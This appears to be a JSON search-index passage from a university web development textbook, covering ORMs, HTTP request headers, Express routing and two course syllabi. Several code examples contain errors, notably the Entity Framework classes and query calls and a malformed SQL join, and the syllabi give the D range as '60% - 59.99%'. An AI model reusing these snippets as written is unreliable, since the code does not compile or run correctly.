\u0026#34;Doctor\u0026#34;}) While we haven\u0026rsquo;t been working in the Ruby language, I show this to help you understand just how far from SQL some ORMs go. For a Ruby programmer, this is far more comfortable syntax than SQL, much like LINQ\u0026rsquo;s method syntax is often more comfortable to C# programmers.\nThat said, there are always some queries - especially when we\u0026rsquo;re trying to squeeze out the most efficiency possible or working with a convoluted database - that are beyond the simple conversion abilities of an ORM to manage. So most ORMs offer a way to run a SQL query directly on the database as well.\nFinally, you should understand that any ORM that provides a functional interface for constructing SQL queries is effectively a domain-specific language that duplicates the functionality of SQL. The SQL generated by these libraries can be far less efficient than a hand-written SQL query written by a knowledgeable programmer. While it can be more comfortable to program in, it may be more valuable to spend the effort developing a solid understanding of SQL and how relational databases work.\nEntity Framework The .NET platform has its own ORM similar to ActiveRecord, the Entity Framework. Like ActiveRecord, you can create the entire database by defining model objects, and then generating migration scripts that will create the database to match (this is called code first migrations in entity framework lingo). As with ActiveRecord, you must define the relationships between tables. To set up the objects (and tables) we saw in the ActiveRecord example, we would write:\npublic class Person { public int ID {get; set;} public string LastName {get; set;} public string FirstName {get; set;} public Address Address {get; set;} public ICollection\u0026lt;Job\u0026gt; Jobs {get; set;} } public class Address { public int ID {get; set;} public string Line1 {get; set;} public string Line2 {get; set;} public string City {get; set;} public string State {get; set;} public int Zip {get; set;} public ICollection\u0026lt;People\u0026gt; People {get; set;} } public class Job { public int ID {get; set;} public string Name {get; set;} public string ICollection\u0026lt;Person\u0026gt; People {get; set;} } Note that this is a lot more verbose; the Entity Framework approach doesn\u0026rsquo;t rely on the database telling it what the available, columns are, rather the model classes are used to determine what the database should be. We also have to set up the relationships, which are done using a class that extends DbContext, i.e.:\npublic class ExampleContext : DbContext { public DbSet\u0026lt;Person\u0026gt; Persons {get; set;} public DbSet\u0026lt;Address\u0026gt; Addresses {get; set;} public DbSet\u0026lt;Job\u0026gt; Jobs {get; set;} protected override void OnModelCreating(ModelBuilder modelBuilder) { modelBuilder.Entity\u0026lt;Person\u0026gt;().ToTable(\u0026#34;People\u0026#34;); modelBuilder.Entity\u0026lt;Address\u0026gt;().ToTable(\u0026#34;Addresses\u0026#34;); modelBuilder.Entity\u0026lt;Job\u0026gt;().ToTable(\u0026#34;Jobs\u0026#34;); modelBuilder.Entity\u0026lt;JobPerson\u0026gt;().ToTable(\u0026#34;JobsPersons\u0026#34;); modelBuilder.Entity\u0026lt;Person\u0026gt;() .HasOne(a =\u0026gt; a.Address) .WithMany(b =\u0026gt; b.Persons); modelBuilder.Entity\u0026lt;Person\u0026gt;(). .HasMany(a =\u0026gt; a.Jobs) .WithMany(b =\u0026gt; b.Persons); } } Note the use of the .HasOne() and .HasMany() methods to set up the relationships between the tables. With this established, we can run queries using an instance of the ExampleContext:\nvar context = new ExampleContext(); // Get all people var allPeople = context.Person.All(); // Get all doctors var allDoctors = context.Person .Include(p =\u0026gt; p.Jobs) .Where(p =\u0026gt; p.Jobs.Includes(j =\u0026gt; j.Name == \u0026#34;Doctor\u0026#34;)); Massive For Node applications, I\u0026rsquo;ve really come to prefer MassiveJS, an ORM for the Postgres relational database. Like other ORMs, it converts query results into a JavaScript object or array of objects, with the column names as keys and values as values, converted to the appropriate type.\nIt does provide a slew of functions for generating queries programmatically, like other ORMs. But it also allows you to specify a folder in your project where you can place SQL files that are automatically converted to JavaScript functions that correspond to parameterized queries in the sql files. For example, to do our \u0026ldquo;All doctors\u0026rdquo; query, we would write a file scripts/allDoctors.sql:\nSELECT * FROM persons INNER JOIN jobs_persons ON persons.id = jobs_persons.person_id INNER JOIN jobs ON jobs.id = jobs_persons.job.id WHERE jobs.name = \u0026#34;Doctor\u0026#34;; While this may seem less convenient than the ActiveRecord or Entity Framework approaches, it is immediately clear to a seasoned SQL programmer what the tables involved are and how they are related. Moreover, a good SQL programmer can often write a more efficient query than an ORM library can generate.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/06-request-headers/",
	"title": "Request Headers",
	"tags": [],
	"description": "",
	"content": "Request headers take the form of key-value pairs, separated by colons : and terminated with a CRLF (a carriage return and line feed character). For example:\nAccept-Encoding: gzip Indicates that the browser knows how to accepted content compressed in the Gzip format.\nNote that request headers are a subset of message headers that apply specifically to requests. There are also message headers that apply only to HTTP responses, and some that apply to both.\nAs HTTP is intended as an extensible protocol, there are a lot of potential headers. IANA maintains the official list of message headers as well as a list of proposed message headers. You can also find a categorized list in the MDN Documentation\nWhile there are many possible request headers, some of the more commonly used are:\nAccept Specifies the types a server can send back, its value is a MIME type.\nAccept-Charset Specifies the character set a browser understands.\nAccept-Encoding Informs the server about encoding algorithms the client can process (most typically compression types)\nAccept-Language Hints to the server what language content should be sent in.\nAuthorization Supplies credentials to authenticate the user to the server. Will be covered in the authentication chapter.\nContent-Length The length of the request body sent, in octets\nContent-Type The MIME type of the request body\nContent-Encoding The encoding method of the request body\nCookie Sends a site cookie - see the section on cookies later\nUser-Agent A string identifying the agent making the request (typically a browser name and version)\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/06-routers/",
	"title": "Routers",
	"tags": [],
	"description": "",
	"content": "Many web development frameworks built upon this concept of routes by supplying a router, and object that would store route patterns and perform the routing operation. One popular Node library express, is at its heart a router. If we were to write our Node blog using Express, the syntax to create our routes would be:\nconst express = require(\u0026#39;express\u0026#39;); var app = express(); // Home page app.get(\u0026#39;/\u0026#39;, serveHome); // Posts app.get(\u0026#39;posts/\u0026#39;, servePosts); app.get(\u0026#39;posts/:id\u0026#39;, servePost); app.post(\u0026#39;posts/\u0026#39;, createPost); app.post(\u0026#39;posts/:id\u0026#39;, updatePost); app.delete(\u0026#39;posts/:id\u0026#39;, deletePost); // Comments app.get(\u0026#39;posts/:post_id/comments\u0026#39;, servePosts); app.get(\u0026#39;posts/:post_id/comments/:id\u0026#39;, servePost); app.post(\u0026#39;posts/:post_id/comments\u0026#39;, createPost); app.post(\u0026#39;posts/:post_id/comments/:id\u0026#39;, updatePost); app.delete(\u0026#39;posts/:post_id/comments/:id\u0026#39;, deletePost); module.exports = app; The app variable is an instance of the express Application class, which itself is a wrapper around Node\u0026rsquo;s http.Server class. The Express Application adds (among other features), routing using the route methods app.get(), app.post(), app.put(), and app.delete(). These take routes either in string or regular expression form, and the wildcard values are assigned to an object in req.params. For example, we might write our servePost() method as:\nservePost(req, res) { var id = req.params.id; var post = db.prepare(\u0026#34;SELECT * FROM posts WHERE ID = ?\u0026#34;, id); // TODO: Render the post HTML } The parameter name in params is the same as the token after the : in the wildcard.\nRouters can greatly simplify the creation of web applications, and provide a clear and concise way to specify routes. For this reason, they form the heart of most dynamic web development frameworks.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/06-syllabus/old/summer2021/",
	"title": "Summer 2021 Syllabus",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nCIS 526 - Web App Development Instructor Contact Information Instructor: Nathan Bean (nhbean AT ksu DOT edu) Office: DUE 2216 Phone: (785)483-9264 (Call/Text) Website: https://nathanhbean.com Virtual Office Hours: By appointment via Zoom. Schedule a meeting via email or Discord Preferred Methods of Communication: Chat: Quick questions via Discord are the preferred means of communication. Questions whose answers may benefit the class I would encourage you to post in the #cis526 channel, as this keeps a public history your classmates can review. More personal questions should be direct messaged to @Nathan Bean. Email: For questions outside of this course, email to nhbean@ksu.edu is preferred. Phone/Text: 785-483-9264 Emergencies only! I will do my best to respond as quickly as I can. Prerequisites CIS 501 CMST 135 or equivalent experience in HTML, CSS, and JavaScript. Students may enroll in CIS courses only if they have earned a grade of C or better for each prerequisite to these courses.\nCourse Overview Fundamental principles and best practices of web development, user interface design, web API design, advanced web interfaces, web development frameworks, single-page web applications, web standards and accessibility issues.\nCourse Description This course focuses on the creation of web applications - programs that use the core technologies of the world-wide-web to deliver interactive and dynamic user experiences. It builds upon a first course in authoring web pages using HTML/CSS/JavaScript, introduces the creation of web servers using the Node programming languages, and building sophisticated web clients using declarative component-based design frameworks like React.\nCourse Objectives The following are the learning objectives of this course:\nStudents will develop a thorough understanding of the http client request - server response pattern, and be able to implement multiple kinds of requests and responses, including HTML tags, browser-based JavaScript, programmatically, and with tools. Students will understand and be able to make use of asynchronous programming, including creating original asynchronous functions and utilizing promises and the async/await key words. Students will be able to develop traditional full-stack web applications using Node, a SQL database, and a Linux OS. Students will be able to develop client-side [progressive] web applications using transpilation and minimization. Students will be able to develop secure web applications using password authentication, cookies, and json web tokens. Major Course Topics The Document Object Model Responsive Web Design JavaScript Object Serialization Notation JavaScript Event Loop Asynchronous functions Promises async/await HTTP AJAX \u0026amp; Fetch Routing REST Form Serialization Formats Developing APIs Database Object Relational Mappers Template Rendering Single-page Applications Progressive Web Applications Course Structure This course is divided in modules, which typically consist of a series of lesson content (as video lectures or online textbook materials) followed by a hands-on tutorial. The tutorials show how to take the ideas just discussed in the lessons and apply them in creating web applications in a step-by-step manner. Following every third module is a larger project assignment, where you will utilize the skills you\u0026rsquo;ve been developing from the lessons and tutorials to iteratively create a web application.\nFor the eight-week summer course, each cluster of three modules plus project should be completed in one week. There is a lot to learn and much of the learning involved is hands-on as you work on the code for tutorials and your projects. It is recommended you set aside 10-20 hours per week to focus on this course.\nLessons are delivered in written or video (with written transcript) form. Sprinkled between lessons are activities and quizzes that check your understanding of the readings and lecture content.\nTutorials are delivered through Codio, and offer immediate, automatically generated feedback as you complete the assignments, letting you know if you\u0026rsquo;ve made a mistake or skipped a step. You can run these assessments as many times as needed until you have completed the project to your satisfaction.\nThe projects are more free-form - I want you to be able to flex your creative muscles and make a web app that both meets your customer\u0026rsquo;s needs and reflects your own style and approach. These will be graded by hand using a rubric that focuses on functionality, code quality, accessibility, and aesthetics.\nGrading In this course, each assignment constitutes a a portion of the final grade, as detailed below:\n25% - Activities \u0026amp; Quizzes 35% - Tutorials 40% - Projects Up to 5% of the total grade in the course is available as extra credit. See the Extra Credit - Bug Bounty and Extra Credit - Helping Hand assignments for details.\nLetter grades will be assigned following the standard scale:\n90% - 100% → A 80% - 89.99% → B 70% - 79.99% → C 60% - 59.99% → D* 50% - 0% → F * Note that CS Majors must earn a C or better to use this course for their degree.\nLate Work Warning\nRead the late work policy very carefully! If you are unsure how to interpret it, please contact the instructor via email. Not understanding the policy does not mean that it won\u0026rsquo;t apply to you!\nIn this class, there is a tremendous amount of new skills to develop in a short amount of time. Falling behind will jepordize your chances of successfully completing the course. Trying to complete late assignments while also working on new material will also make it unlikely that you will retain what you are trying to learn. It is critical that you keep on-track. Accordingly work submitted after its due date wil have its grade reduced by 50% of the total points possible on that item.\nHowever, even if a module is not submitted on time, it must still be completed before a student is allowed to begin the next module. So, students should take care not to get too far behind, as it may be very difficult to catch up.\nFinally, all course work must be submitted on or before the last day of the semester in which the student is enrolled in the course in order for it to be graded. No incompletes will be given in this course for any reason.\nIf you have extenuating circumstances, please discuss them with the instructor as soon as they arise so other arrangements can be made. If you find that you are getting behind in the class, you are encouraged to speak to the instructor for options to make up missed work.\nRecommended Texts \u0026amp; Supplies To participate in this course, students must have access to a modern web browser and broadband internet connection. All course materials will be provided via Canvas and Codio. Modules may also contain links to external resources for additional information, such as programming language documentation.\nIn particular you are encouraged to use:\nNode Docs - THe documentation for the Nodejs platform and APIs. Mozilla Developer Network - A key reference explaining how browsers implement the web standards CSS-Tricks - A collectiotn of guides and articles on using CSS to accomplish a variety of tasks w3c.org - The online home of the World-Wide-Web Consortium, the organization that sets web technology standards This course offers an instructor-written textbook, which is broken up into a specific reading order and interleaved with activities and quizzes in the modules. It can also be directly accessed at https://textbooks.cs.ksu.edu/cis526.\nStudents who would like additional textbooks should refer to resources available on the O\u0026rsquo;Riley For Higher Education digital library offered by the Kansas State University Library. These include electronic editions of popular textbooks as well as videos and tutorials.\nSubject to Change The details in this syllabus are not set in stone. Due to the flexible nature of this class, adjustments may need to be made as the semester progresses, though they will be kept to a minimum. If any changes occur, the changes will be posted on the Canvas page for this course and emailed to all students.\nAcademic Honesty Kansas State University has an Honor and Integrity System based on personal integrity, which is presumed to be sufficient assurance that, in academic matters, one’s work is performed honestly and without unauthorized assistance. Undergraduate and graduate students, by registration, acknowledge the jurisdiction of the Honor and Integrity System. The policies and procedures of the Honor and Integrity System apply to all full and part-time students enrolled in undergraduate and graduate courses on-campus, off-campus, and via distance learning. A component vital to the Honor and Integrity System is the inclusion of the Honor Pledge which applies to all assignments, examinations, or other course work undertaken by students. The Honor Pledge is implied, whether or not it is stated: “On my honor, as a student, I have neither given nor received unauthorized aid on this academic work.” A grade of XF can result from a breach of academic honesty. The F indicates failure in the course; the X indicates the reason is an Honor Pledge violation.\nFor this course, a violation of the Honor Pledge will result in an automatic 0 for the assignment and the violation will be reported to the Honor System. A second violation will result in an XF in the course.\nIn this course, unauthorized aid broadly consists of giving or receiving code to complete assignments. This could be code you share with a classmate, code you have asked a third party to write for you, or code you have found online or elsewhere.\nAuthorized aid - which is not a violation of the honor policy - includes using the code snippets provided in the course materials, discussing strategies and techniques with classmates, instructors, TAs, and mentors. Additionally, you may use code snippets and algorithms found in textbooks and web sources if you clearly label them with comments indicating where the code came from and how it is being used in your project.\nYou should restrict your use of code libraries to those specified in the assignment description or approved by the instructor. You can ask for approval via RocketChat in the course channel, and if granted, this approval is valid for the entire class for the specified assignment.\nInfo\nWhile code libraries are an important and common tool in professional practice, at this point in your learning they can obscure how tasks are being accomplished, leaving your foundational knowledge incomplete. It is for this reason that we restrict the use of code libraries in the course.\nStudents with Disabilities Students with disabilities who need classroom accommodations, access to technology, or information about emergency building/campus evacuation processes should contact the Student Access Center and/or their instructor. Services are available to students with a wide range of disabilities including, but not limited to, physical disabilities, medical conditions, learning disabilities, attention deficit disorder, depression, and anxiety. If you are a student enrolled in campus/online courses through the Manhattan or Olathe campuses, contact the Student Access Center at accesscenter@k-state.edu, 785-532-6441; for K-State Polytechnic campus, contact Academic and Student Services at polytechnicadvising@ksu.edu or call 785-826-2674.\nDiversity and Inclusion Note\nThis is our personal policy and not a required syllabus statement from K-State. It has been adapted from this statement created by two educators at Brown University. We feel that a statement such as this is very powerful and important in today’s world, and we’ll do our best to live up to it.\nIn an ideal world, science and technology would be objective. However, much of science and technology is subjective and is historically built on a small subset of privileged voices. In this class, we will reference many materials from a diverse set of sources, but limits still exist on this diversity. I acknowledge that it is possible that there may be both overt and covert biases in the material due to the lens with which it was written, even though the material is primarily of a technical nature.\nPlease contact me or submit anonymous feedback through the Computer Science department office if you have any concerns or suggestions regarding this course and related materials.\nNetiquette Note\nThis is our personal policy and not a required syllabus statement from K-State. It has been adapted from this statement from K-State Global Campus, and the Recurse Center Manual. We have adapted their ideas to fit this course.\nOnline communication is inherently different than in-person communication. When speaking in person, many times we can take advantage of the context and body language of the person speaking to better understand what the speaker means, not just what is said. This information is not present when communicating online, so we must be much more careful about what we say and how we say it in order to get our meaning across.\nHere are a few general rules to help us all communicate online in this course, especially while using tools such as email or Canvas:\nUse a clear and meaningful subject line to announce your topic. Subject lines such as “Question” or “Problem” are not helpful. Subjects such as “Logic Question in Project 5, Part 1 in Java” or “Unexpected Exception when Opening Text File in Python” give plenty of information about your topic. Use only one topic per message. If you have multiple topics, post multiple messages so each one can be discussed independently. Be thorough, concise, and to the point. Ideally, each message should be a page or less. Include exact error messages, code snippets, or screenshots, as well as any previous steps taken to fix the problem. It is much easier to solve a problem when the exact error message or screenshot is provided. If we know what you’ve tried so far, we can get to the root cause of the issue more quickly. Consider carefully what you write before you post it. Once a message is posted, it becomes part of the permanent record of the course and can easily be found by others. If you are lost, don’t know an answer, or don’t understand something, speak up! Email allows you to send a message privately to the instructors. Don’t be afraid to ask questions anytime, as you can choose to do so without any fear of being identified by your fellow students. Class discussions are confidential. Do not share information from the course with anyone outside of the course without explicit permission. Do not quote entire message chains; only include the relevant parts. When replying to a previous message, only quote the relevant lines in your response. Do not use all caps. It makes it look like you are shouting. Use appropriate text markup (bold, italics, etc.) to highlight a point if needed. No feigning surprise. If someone asks a question, saying things like “I can’t believe you don’t know that!” are not helpful, and only serve to make that person feel bad. No “well-actually’s.\u0026quot; If someone makes a statement that is not entirely correct, resist the urge to offer a “well, actually…” correction, especially if it is not relevant to the discussion. If you can help solve their problem, feel free to provide correct information, but don’t post a correction just for the sake of being correct. Do not correct someone’s grammar or spelling. Again, it is not helpful, and only serves to make that person feel bad. If there is a genuine mistake that may affect the meaning of the post, please contact the person privately or let the instructors know privately so it can be resolved. Avoid subtle -isms and microaggressions. Avoid comments that could make others feel uncomfortable based on their personal identity. See the syllabus section on Diversity and Inclusion above for more information on this topic. If a comment makes you uncomfortable, please contact the instructor. Avoid sarcasm, flaming, advertisements, lingo, trolling, doxxing, and other bad online habits. They have no place in an academic environment. Tasteful humor is fine, but sarcasm can be misunderstood. Expectations of Conduct All student activities in the University, including this course, are governed by the Student Judicial Conduct Code as outlined in the Student Governing Association By Laws, Article V, Section 3, number 2. Students who engage in behavior that disrupts the learning environment may be asked to leave the class.\nCampus Safety Kansas State University is committed to providing a safe teaching and learning environment for student and faculty members. In order to enhance your safety in the unlikely case of a campus emergency make sure that you know where and how to quickly exit your classroom and how to follow any emergency directives. To view additional campus emergency information go to the University’s main page, www.k-state.edu, and click on the Emergency Information button, located at the bottom of the page.\nStudent Resources K-State has many resources to help contribute to student success. These resources include accommodations for academics, paying for college, student life, health and safety, and others found at www.k-state.edu/onestop.\nAcademic Freedom Statement Kansas State University is a community of students, faculty, and staff who work together to discover new knowledge, create new ideas, and share the results of their scholarly inquiry with the wider public. Although new ideas or research results may be controversial or challenge established views, the health and growth of any society requires frank intellectual exchange. Academic freedom protects this type of free exchange and is thus essential to any university’s mission.\nMoreover, academic freedom supports collaborative work in the pursuit of truth and the dissemination of knowledge in an environment of inquiry, respectful debate, and professionalism. Academic freedom is not limited to the classroom or to scientific and scholarly research, but extends to the life of the university as well as to larger social and political questions. It is the right and responsibility of the university community to engage with such issues.\nCopyright Notice ©2020 The materials in this online course fall under the protection of all intellectual property, copyright and trademark laws of the U.S. The digital materials included here come with the legal permissions and releases of the copyright holders. These course materials should be used for educational purposes only; the contents should not be distributed electronically or otherwise beyond the confines of this online course. The URLs listed here do not suggest endorsement of either the site owners or the contents found at the sites. Likewise, mentioned brands (products and services) do not suggest endorsement. Students own copyright to what they create.\nOriginal content in the course textbook at https://textbooks.cs.ksu.edu/cis526 is licensed under a Creative Commons BY-SA license by Nathan Bean unless otherwise stated.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/06-syllabus/",
	"title": "Summer 2022 Syllabus",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nCIS 526 - Web Application Development CC 515 - Full Stack Web Development Previous Versions\nThis syllabus covers both courses. They are taught using the same content.\nInstructor Contact Information Instructor: Russell Feldhausen (russfeld AT ksu DOT edu)\nI use he/him pronouns. Feel free to share your own pronouns with me, and I\u0026rsquo;ll do my best to use them! Office: DUE 2213, but I mostly work remotely from Kansas City, MO Phone: (785) 292-3121 (Call/Text) Website: https://russfeld.me Virtual Office Hours: By appointment via Zoom. Schedule a meeting at https://calendly.com/russfeld Preferred Methods of Communication: Email: Email is the official method of communication for this course. Any emails sent to the instructor regarding this course should be answered within one class day. Discord: For short questions and discussions of course content and assignments, Discord is preferred since questions can be asked once and answered for all students. There is a #cis-526_cc-515 channel on the K-State CS Discord Server for this course. Students are encouraged to post questions there and use that space for discussion, and the instructor will strive to answer questions there as well. Phone/Text: Emergencies only! I will do my best to respond as quickly as I can. Prerequisites CIS 526: CIS 501, CIS 560 (Prerequisite or Concurrent Enrollment), and either CMST 135 or equivalent experience in HTML, CSS, and JavaScript with instructor permission. CC 515: CC 315, CC 410 (Prerequisite or Concurrent Enrollment), and either CC 120, CMST 135, or equivalent experience in HTML, CSS, and JavaScript with instructor permission. Students may enroll in CIS or CC courses only if they have earned a grade of C or better for each prerequisite to those courses.\nCourse Overview Fundamental principles and best practices of web development, user interface design, web API design, advanced web interfaces, web development frameworks, single-page web applications, web standards and accessibility issues.\nCourse Description This course focuses on the creation of web applications - programs that use the core technologies of the world-wide-web to deliver interactive and dynamic user experiences. It builds upon a first course in authoring web pages using HTML/CSS/JavaScript, introduces the creation of web servers using the Node programming languages, and building sophisticated web clients using declarative component-based design frameworks like React.\nStudent Learning Outcomes The following are the learning objectives of this course:\nStudents will develop a thorough understanding of the http client request - server response pattern, and be able to implement multiple kinds of requests and responses, including HTML tags, browser-based JavaScript, programmatically, and with tools. Students will understand and be able to make use of asynchronous programming, including creating original asynchronous functions and utilizing promises and the async/await key words. Students will be able to develop traditional full-stack web applications using Node, a SQL database, and a Linux OS. Students will be able to develop client-side [progressive] web applications using transpilation and minimization. Students will be able to develop secure web applications using password authentication, cookies, and json web tokens. Major Course Topics The Document Object Model Responsive Web Design JavaScript Object Serialization Notation JavaScript Event Loop Asynchronous functions Promises async/await HTTP AJAX \u0026amp; Fetch Routing REST Form Serialization Formats Developing APIs Database Object Relational Mappers Template Rendering Single-page Applications Progressive Web Applications Course Structure This course is divided in modules, which typically consist of a series of lesson content (as video lectures or online textbook materials) followed by a hands-on tutorial. The tutorials show how to take the ideas just discussed in the lessons and apply them in creating web applications in a step-by-step manner. Following every third module is a larger project assignment, where you will utilize the skills you\u0026rsquo;ve been developing from the lessons and tutorials to iteratively create a web application.\nFor the eight-week summer course, each cluster of three modules plus project should be completed in one week. There is a lot to learn and much of the learning involved is hands-on as you work on the code for tutorials and your projects. It is recommended you set aside 10-20 hours per week to focus on this course.\nThe Work There is no shortcut to becoming a great programmer or web developer. Only by doing the work will you develop the skills and knowledge to make you a successful web developer. This course is built around that principle, and gives you ample opportunity to do the work, with as much support as we can offer.\nLessons: Lessons are delivered in written or video (with written transcript) form. Sprinkled between lessons are activities and quizzes that check your understanding of the readings and lecture content.\nTutorials: Tutorials are delivered through Codio, and offer immediate, automatically generated feedback as you complete the assignments, letting you know if you\u0026rsquo;ve made a mistake or skipped a step. You can run these assessments as many times as needed until you have completed the project to your satisfaction.\nProjects: The projects are more free-form - I want you to be able to flex your creative muscles and make a web app that both meets your customer\u0026rsquo;s needs and reflects your own style and approach. These will be graded by hand using a rubric that focuses on functionality, code quality, accessibility, and aesthetics.\nGrading In theory, each student begins the course with an A. As you submit work, you can either maintain your A (for good work) or chip away at it (for less adequate or incomplete work). In practice, each student starts with 0 points in the gradebook and works upward toward a final point total earned out of the possible number of points. IIn this course, each assignment constitutes a a portion of the final grade, as detailed below:\n15% - Activities \u0026amp; Quizzes 35% - Tutorials 50% - Projects Up to 5% of the total grade in the course is available as extra credit. See the Extra Credit - Bug Bounty and Extra Credit - Helping Hand assignments for details.\nLetter grades will be assigned following the standard scale:\n90% - 100% → A 80% - 89.99% → B 70% - 79.99% → C 60% - 59.99% → D* 50% - 0% → F * Note that CS Majors must earn a C or better to use the CIS 526 course for their degree.\nSubmission, Regrading, and Early Grading Policy As a rule, submissions in this course will not be graded until after they are due, even if submitted early. Students may resubmit assignments many times before the due date, and only the latest submission will be graded. For assignments submitted via GitHub release tag, only the tagged release that was submitted to Canvas will be graded, even if additional commits have been made. Students must create a new tagged release and resubmit that tag to have it graded for that assignment.\nOnce an assignment is graded, students are not allowed to resubmit the assignment for regrading or additional credit without special permission from the instructor to do so. In essence, students are expected to ensure their work is complete and meets the requirements before submission, not after feedback is given by the instructor during grading. However, students should use that feedback to improve future assignments and milestones.\nFor the programming project milestones, it is solely at the discretion of the instructor whether issues noted in the feedback for a milestone will result in grade deductions in a later milestones if they remain unresolved, though the instructor will strive to give students ample time to resolve issues before any additional grade deductions are made.\nLikewise, students may ask questions of the instructor while working on the assignment and receive help, but the instructor will not perform a full code review nor give grading-level feedback until after the assignment is submitted and the due date has passed. Again, students are expected to be able to make their own judgments on the quality and completion of an assignment before submission.\nThat said, a student may email the instructor to request early grading on an assignment before the due date, in order to move ahead more quickly. The instructor\u0026rsquo;s receipt of that email will effectively mean that the assignment for that student is due immediately, and all limitations above will apply as if the assignment\u0026rsquo;s due date has now passed.\nCollaboration Policy In this course, all work submitted by a student should be created solely by the student without any outside assistance beyond the instructor and TA/GTAs. Students may seek outside help or tutoring regarding concepts presented in the course, but should not share or receive any answers, source code, program structure, or any other materials related to the course. Learning to debug problems is a vital skill, and students should strive to ask good questions and perform their own research instead of just sharing broken source code when asking for assistance.\nThat said, the field of web development requires the use of lots of online documentation and reference materials, and the point of the class is to learn how to effectively use those resources instead of \u0026ldquo;reinventing the wheel from scratch\u0026rdquo; in each assignment. Whenever content in an assignment is taken from an outside source, this should be noted somewhere in the assignment.\nLate Work Warning\nI\u0026rsquo;ve found that students prefer having more strict deadlines than more flexibility in a summer course, and many times they will perform better in the course when deadlines are enforced. Therefore, deadlines will be strictly enforced this semester. Read this late work policy very carefully! If you are unsure how to interpret it, please contact the instructors via email. Not understanding the policy does not mean that it won\u0026rsquo;t apply to you!\nIn this class, there is a tremendous amount of new skills to develop in a short amount of time. Falling behind will jeopardize your chances of successfully completing the course. Trying to complete late assignments while also working on new material will also make it unlikely that you will retain what you are trying to learn. It is critical that you keep on-track.\nAny work submitted and graded after the due date is subject to a deduction of 10% of the total points possible on the assignment for each day that the assignment is late. For example, if an assignment is due on a Friday and is submitted the following Tuesday, it will be subject to a reduction of 40% of the total points possible, or 10% for each class day it was late. These late penalties will be automatically entered by Canvas - contact the instructor if any grades appear to be incorrect.\nThese deductions will only be applied to grades above 50% of the total points on the assignment. So, if you scored higher than 50%, your grade will be reduced by the late penalty down to a minimum grade of 50%. If you scored lower than 50% on the assignment, no deductions will be applied.\nHowever, even if a module is not submitted on time, it must still be completed before a student is allowed to begin the next module. So, students should take care not to get too far behind, as it may be very difficult to catch up.\nAll course work must be submitted, and all interactively graded materials must be graded with the instructor, on or before the last day of the semester in which the student is enrolled in the course in order for it to be graded on time. No late work will be accepted after that date.\nIf you have extenuating circumstances, please discuss them with the instructor as soon as they arise so other arrangements can be made. If you know you have upcoming events that will prevent you from completing work in this course, you should contact the instructor ASAP and plan on working ahead before your event instead of catching up afterwards. If you find that you are getting behind in the class, you are encouraged to speak to the instructor for options to catch up quickly.\nIncomplete Policy Students should strive to complete this course in its entirety before the end of the semester in which they are enrolled. However, since retaking the course would be costly and repetitive for students, we would like to give students a chance to succeed with a little help rather than immediately fail students who are struggling.\nIf you are unable to complete the course in a timely manner, please contact the instructor to discuss an incomplete grade. Incomplete grades are given solely at the instructor\u0026rsquo;s discretion. See the official K-State Grading Policy for more information. In general, poor time management alone is not a sufficient reason for an incomplete grade.\nUnless otherwise noted in writing on a signed Incomplete Agreement Form, the following stipulations apply to any incomplete grades given in this course:\nStudents will be given 6 calendar weeks from the end of the enrolled semester\u0026rsquo;s finals week to complete the course Students understand that access to instructor and GTA assistance may be limited after the end of an academic semester due to holidays and other obligations If a student fails to resolve an incomplete grade after 6 weeks, they will be assigned an \u0026lsquo;F\u0026rsquo; in the course. In addition, they will be dropped from any other courses which require the failed course as a prerequisite or corequisite. For CC courses only: Students may receive at most two incompletes in Computational Core courses throughout their time in the program. Any modules in a future CC course which depend on incomplete work will not be accessible until the previous course is finished For example, if a student is given an incomplete in CC 210, then all modules in CC 310 will be inaccessible until CC 210 is complete Recommended Texts \u0026amp; Supplies To participate in this course, students must have access to a modern web browser and broadband internet connection. All course materials will be provided via Canvas and Codio. Modules may also contain links to external resources for additional information, such as programming language documentation.\nIn particular you are encouraged to use:\nNode Docs - THe documentation for the Nodejs platform and APIs. Mozilla Developer Network - A key reference explaining how browsers implement the web standards CSS-Tricks - A collection of guides and articles on using CSS to accomplish a variety of tasks w3c.org - The online home of the World-Wide-Web Consortium, the organization that sets web technology standards This course offers an instructor-written textbook, which is broken up into a specific reading order and interleaved with activities and quizzes in the modules. It can also be directly accessed at https://textbooks.cs.ksu.edu/cis526.\nStudents who would like additional textbooks should refer to resources available on the O\u0026rsquo;Riley For Higher Education digital library offered by the Kansas State University Library. These include electronic editions of popular textbooks as well as videos and tutorials.\nSubject to Change The details in this syllabus are not set in stone. Due to the flexible nature of this class, adjustments may need to be made as the semester progresses, though they will be kept to a minimum. If any changes occur, the changes will be posted on the Canvas page for this course and emailed to all students.\nAcademic Honesty Kansas State University has an Honor and Integrity System based on personal integrity, which is presumed to be sufficient assurance that, in academic matters, one\u0026rsquo;s work is performed honestly and without unauthorized assistance. Undergraduate and graduate students, by registration, acknowledge the jurisdiction of the Honor and Integrity System. The policies and procedures of the Honor and Integrity System apply to all full and part-time students enrolled in undergraduate and graduate courses on-campus, off-campus, and via distance learning. A component vital to the Honor and Integrity System is the inclusion of the Honor Pledge which applies to all assignments, examinations, or other course work undertaken by students. The Honor Pledge is implied, whether or not it is stated: \u0026ldquo;On my honor, as a student, I have neither given nor received unauthorized aid on this academic work.\u0026rdquo; A grade of XF can result from a breach of academic honesty. The F indicates failure in the course; the X indicates the reason is an Honor Pledge violation.\nFor this course, a violation of the Honor Pledge will result in sanctions such as a 0 on the assignment or an XF in the course, depending on severity. Actively seeking unauthorized aid, such as posting lab assignments on sites such as Chegg or StackOverflow or asking another person to complete your work, even if unsuccessful, will result in an immediate XF in the course.\nThe Codio platform can perform automatic plagiarism detection by comparing submitted projects against other students\u0026rsquo; submissions and known solutions. That information may be used to determine if plagiarism has taken place.\nIn this course, unauthorized aid broadly consists of giving or receiving code to complete assignments. This could be code you share with a classmate, code you have asked a third party to write for you, or code you have found online or elsewhere.\nAuthorized aid - which is not a violation of the honor policy - includes using the code snippets provided in the course materials, discussing strategies and techniques with classmates, instructors, TAs, and 